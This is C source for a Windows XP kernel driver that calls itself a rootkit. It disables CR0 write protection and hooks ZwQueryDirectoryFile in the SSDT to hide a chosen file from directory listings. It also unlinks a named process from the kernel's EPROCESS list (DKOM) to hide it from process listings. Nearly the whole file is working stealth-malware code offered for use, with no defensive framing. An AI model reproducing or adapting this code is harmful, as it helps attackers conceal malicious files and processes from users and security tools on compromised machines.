/*
    Author:     @DimitriFourny
    Project:    kBase
    Desc:       Hide a file/directory and a process
                [SSDT Hook on ZwQueryDirectoryFile + DKOM on EPROCESS]
    Test:       Windows XP Pro SP3 x86

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <ntddk.h>

#define PROCESS_TO_HIDE "Hello.exe"
#define FILE_TO_HIDE "Hello.exe"
#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1) 
/*  
    kd> u !ZwQueryDirectoryFile
    nt!ZwQueryDirectoryFile:
    804fe8ec b891000000      mov     eax,91h

    So SYSCALL_INDEX(ZwQueryDirectoryFile) = 0xb8[91]000000 = 0x91
*/

// Strucs
///////////////////////////////////////////////////////////////////////////////////

typedef unsigned long DWORD;
typedef DWORD* PDWORD;

#pragma pack(1)   
typedef struct ServiceDescriptorEntry {   
        unsigned int *ServiceTableBase;   
        unsigned int *ServiceCounterTableBase;  
        unsigned int NumberOfServices;   
        unsigned char *ParamTableBase;   
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;   
#pragma pack()   
__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;   
  
NTSYSAPI NTSTATUS NTAPI ZwQueryDirectoryFile(IN HANDLE FileHandle, IN HANDLE Event OPTIONAL, IN PIO_APC_ROUTINE ApcRoutine OPTIONAL, IN PVOID ApcContext OPTIONAL, 
											OUT PIO_STATUS_BLOCK IoStatusBlock, OUT PVOID FileInformation, IN ULONG Length, IN FILE_INFORMATION_CLASS FileInformationClass, 
											IN BOOLEAN ReturnSingleEntry, IN PUNICODE_STRING FileMask OPTIONAL, IN BOOLEAN RestartScan); 

typedef NTSTATUS (*_ZwQueryDirectoryFile)(IN HANDLE FileHandle, IN HANDLE Event OPTIONAL, IN PIO_APC_ROUTINE ApcRoutine OPTIONAL, IN PVOID ApcContext OPTIONAL, 
											OUT PIO_STATUS_BLOCK IoStatusBlock, OUT PVOID FileInformation, IN ULONG Length, IN FILE_INFORMATION_CLASS FileInformationClass, 
											IN BOOLEAN ReturnSingleEntry, IN PUNICODE_STRING FileMask OPTIONAL, IN BOOLEAN RestartScan); 								

typedef struct _FILE_DIRECTORY_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;
 
typedef struct _FILE_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    WCHAR FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;
 
typedef struct _FILE_ID_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, *PFILE_ID_FULL_DIR_INFORMATION;
 
typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;
 
typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;
 
typedef struct _FILE_NAMES_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;

// Global variables
///////////////////////////////////////////////////////////////////////////////////

_ZwQueryDirectoryFile oldZwQueryDirectoryFile;
PDWORD pTableQueryDirectoryFile;

// Functions
///////////////////////////////////////////////////////////////////////////////////

void unprotectSSDT() {
	__asm {
		push eax
		mov eax, CR0
		and eax, 0FFFEFFFFh
		mov CR0, eax
		pop eax
	}
	
	DbgPrint("[+] SSDT unprotected\n");
}
void protectSSDT() {
	__asm {
		push eax
		mov eax, CR0
		or eax, NOT 0FFFEFFFFh
		mov CR0, eax
		pop eax
	}
	
	DbgPrint("[-] SSDT protected\n");
}

PVOID getBufferFileName(PVOID FileInformationBuffer, FILE_INFORMATION_CLASS FileInformationClass) {
    PVOID result = 0;
	
    switch(FileInformationClass) {
        case FileDirectoryInformation:
            result = (PVOID)&((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileName[0];
            break;
        case FileFullDirectoryInformation:
            result =(PVOID)&((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
            break;
        case FileIdFullDirectoryInformation:
            result =(PVOID)&((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
            break;
        case FileBothDirectoryInformation:
            result =(PVOID)&((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
            break;
        case FileIdBothDirectoryInformation:
            result =(PVOID)&((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
            break;
        case FileNamesInformation:
            result =(PVOID)&((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileName[0];
            break;
    }
	
    return result;
}

DWORD getBufferLinkToNext(PVOID FileInformationBuffer, FILE_INFORMATION_CLASS FileInformationClass)
{
    DWORD result = 0;
	
    switch(FileInformationClass) {
        case FileDirectoryInformation:
            result = ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset;
            break;
        case FileFullDirectoryInformation:
            result = ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
            break;
        case FileIdFullDirectoryInformation:
            result = ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
            break;
        case FileBothDirectoryInformation:
            result = ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
            break;
        case FileIdBothDirectoryInformation:
            result = ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
            break;
        case FileNamesInformation:
            result = ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset;
            break;
    }
	
    return result;
}
void setBufferLinkToNext(PVOID FileInformationBuffer, FILE_INFORMATION_CLASS FileInformationClass, DWORD value)
{
    switch(FileInformationClass) {
        case FileDirectoryInformation:
            ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
            break;
        case FileFullDirectoryInformation:
            ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
            break;
        case FileIdFullDirectoryInformation:
            ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
            break;
        case FileBothDirectoryInformation:
            ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
            break;
        case FileIdBothDirectoryInformation:
            ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
            break;
        case FileNamesInformation:
            ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
            break;
    }
}

NTSTATUS newZwQueryDirectoryFile(IN HANDLE FileHandle, IN HANDLE Event OPTIONAL, IN PIO_APC_ROUTINE ApcRoutine OPTIONAL, IN PVOID ApcContext OPTIONAL, 
											OUT PIO_STATUS_BLOCK IoStatusBlock, OUT PVOID FileInformation, IN ULONG Length, IN FILE_INFORMATION_CLASS FileInformationClass, 
											IN BOOLEAN ReturnSingleEntry, IN PUNICODE_STRING FileMask OPTIONAL, IN BOOLEAN RestartScan) {
	NTSTATUS ret;
	UNICODE_STRING entryName;
	ANSI_STRING fileName;
	DWORD linkToNext;
	DWORD oldFileInformation;
	int nProcess = 0;
	
	ret = oldZwQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileMask, RestartScan);
	
    if(NT_SUCCESS(ret) && (	FileInformationClass == FileDirectoryInformation ||
							FileInformationClass == FileFullDirectoryInformation ||
							FileInformationClass == FileIdFullDirectoryInformation ||
							FileInformationClass == FileBothDirectoryInformation ||
							FileInformationClass == FileIdBothDirectoryInformation ||
							FileInformationClass == FileNamesInformation)) 
	{
		while (1) {
			RtlInitUnicodeString(&entryName, getBufferFileName(FileInformation, FileInformationClass));
			RtlUnicodeStringToAnsiString(&fileName, &entryName, 1);
			
			linkToNext = getBufferLinkToNext(FileInformation, FileInformationClass);
			
			if (strcmp(fileName.Buffer, FILE_TO_HIDE) == 0) {
				DbgPrint("[I] %s found! Work in progress...\n", FILE_TO_HIDE);
				
				if (linkToNext == 0)  { // Fin de la liste chainée
					if (nProcess == 0) { // C'est le seul fichier
						return 0x80000006;
					}
					else {
						setBufferLinkToNext(oldFileInformation, FileInformationClass, 0);
					}
				}
				else {
					setBufferLinkToNext(oldFileInformation, FileInformationClass, getBufferLinkToNext(oldFileInformation, FileInformationClass) + linkToNext);
				}
			}
			
			if (linkToNext == 0)  { // Fin de la liste chainée
				break;
			}

			oldFileInformation = FileInformation;
			FileInformation = (DWORD)FileInformation + linkToNext;
			
			nProcess++;
		}
	}
	
	return ret;
}

int hideProcess(char* processToHide) {
    PEPROCESS currentProcess;
    PEPROCESS nextProcess;
    PLIST_ENTRY listProcess;
    int success = 0;

    currentProcess = IoGetCurrentProcess();
    nextProcess = currentProcess;

    do {
        listProcess = (PLIST_ENTRY)((PUCHAR)nextProcess + 0x88);    // +0x088 ActiveProcessLinks : _LIST_ENTRY

        if (strcmp((PUCHAR)((PUCHAR)nextProcess + 0x174), processToHide) == 0) {
            DbgPrint("[I] %s found! WIP...", processToHide);

            // +0x000 Flink
            // +0x004 Blink
            // => Flink + 1 = Blink of the next member
            *((PDWORD) listProcess->Flink + 1) = (DWORD) listProcess->Blink;
            *((PDWORD) listProcess->Blink) = (DWORD) listProcess->Flink; // Blink = Flink of the previous member
            success = 1;
        }

        nextProcess = (PEPROCESS) listProcess->Flink;
        nextProcess = (PEPROCESS)((PUCHAR)nextProcess - 0x88); // ActiveProcessLinks->Flink jump on "ActiveProcessLinks" in the next process
    } while (nextProcess != currentProcess);

    return success;
}

// Driver entry
///////////////////////////////////////////////////////////////////////////////////

VOID unload(PDRIVER_OBJECT pDriverObject) {
	*pTableQueryDirectoryFile = oldZwQueryDirectoryFile; // Unhook
	DbgPrint("[-] Cya!\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
    pDriverObject->DriverUnload = unload;
	DbgPrint("[+] Rootkit activated\n");

    // Hook of ZwQueryDirectoryFile
    //
	unprotectSSDT();
	DbgPrint("[I] Index of ZwQueryDirectoryFile: 0x%X\n", SYSCALL_INDEX(ZwQueryDirectoryFile));
	
	pTableQueryDirectoryFile = (PDWORD)(KeServiceDescriptorTable.ServiceTableBase + SYSCALL_INDEX(ZwQueryDirectoryFile));
	oldZwQueryDirectoryFile = *pTableQueryDirectoryFile;
	DbgPrint("[I] NtQueryDirectoryFile: 0x%X\n", (PULONG) oldZwQueryDirectoryFile);
	
	*pTableQueryDirectoryFile = newZwQueryDirectoryFile; // Hook
	DbgPrint("[I] NtQueryDirectoryFile hooked!\n");
	protectSSDT();

    // DKOM on EPROCESS
    //
    hideProcess(PROCESS_TO_HIDE);
	
	return STATUS_SUCCESS;
}